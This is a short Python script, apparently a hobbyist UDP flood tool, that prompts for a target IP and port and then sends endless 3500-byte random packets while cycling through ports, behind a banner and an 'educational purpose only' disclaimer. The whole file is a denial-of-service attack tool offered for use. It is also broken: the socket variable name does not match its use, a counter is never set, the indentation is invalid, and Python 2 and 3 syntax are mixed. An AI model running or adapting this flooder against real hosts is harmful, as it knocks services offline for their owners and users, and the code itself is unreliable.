#!/usr/bin/python3

#EDUCATIONAL PURPOSE ONLY

import socket
import random
import threading
import os
import sys


white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print(" ")
print("           0ppppppp0      0  0      0000000      0     0        ") 
print("           0       0      0 0       0            0     0        ") 
print("           0       0      00        0000000      0000000        ") 
print("           0       0      00        0000000      0     0        ") 
print("           0       0      0 0       0            0     0        ") 
print("           0ppppppp0      0  0      0000000      0     0        ") 
print("THIS TOOLS DONT ATTACK GOV")

 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "sent %s packet to%s trought port:%s"%(sent,ip,port) 
     if port == 65534:
         port = 1
#DONE CUY

